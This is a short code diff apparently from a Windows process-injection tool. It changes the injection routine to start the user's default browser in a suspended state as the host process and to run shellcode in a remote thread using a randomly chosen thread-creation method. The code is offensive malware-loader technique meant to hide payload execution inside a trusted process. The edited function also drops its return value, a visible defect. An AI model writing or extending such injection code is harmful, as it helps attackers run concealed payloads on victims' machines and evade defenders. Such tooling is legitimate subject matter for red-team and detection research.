@@ -66,9 +66,14 @@ PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeS
 
 bool inject_in_new_process(INJECTION_POINT mode)
 {
+    //get target path
+    WCHAR cmdLine[MAX_PATH];
+    get_default_browser(cmdLine, MAX_PATH);
+
+    //create suspended process
     PROCESS_INFORMATION pi;
     memset(&pi, 0, sizeof(PROCESS_INFORMATION));
-    if (create_new_process2(pi) == false) {
+    if (create_new_process2(pi, cmdLine) == false) {
         return false;
     }
     LPVOID remote_shellcode_ptr = NULL;
@@ -101,7 +106,7 @@ bool inject_in_existing_process()
     if (remote_shellcode_ptr == NULL) {
         return false;
     }
-    return run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
+    run_shellcode_in_new_thread(hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
 }
 
 int main()
